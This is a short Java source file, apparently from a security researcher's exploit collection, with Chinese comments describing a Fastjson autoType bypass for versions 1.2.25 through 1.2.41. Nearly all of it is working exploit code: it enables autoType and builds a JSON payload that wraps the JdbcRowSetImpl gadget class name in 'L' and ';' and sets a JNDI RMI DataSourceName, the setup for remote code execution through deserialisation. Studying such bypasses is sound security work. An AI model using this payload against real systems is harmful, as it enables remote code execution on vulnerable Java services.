package com.yyjccc.fastjson.exp.bypass.autotype;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * 条件：需要开启AutoType
 * jdk: 8
 * 版本：1.2.25 <= fastjson <= 1.2.41
 * 补丁：添加AutoTypeSupport检查机制
 * 描述： 在@type指定的类前面加上L后面加上;
 */

public class fastjson1241 {
	public static void main(String[] args) {
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
		JSON.parse(payload());
	}


	public static String payload(){

		String jndiAddress="rmi://127.0.0.1:8085/ngmjzGDj";
		String data="{\n\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\n\"DataSourceName\":\""+jndiAddress+"\",\n\"AutoCommit\":false\n}";
		System.out.println(data);
		return data;
	}
}
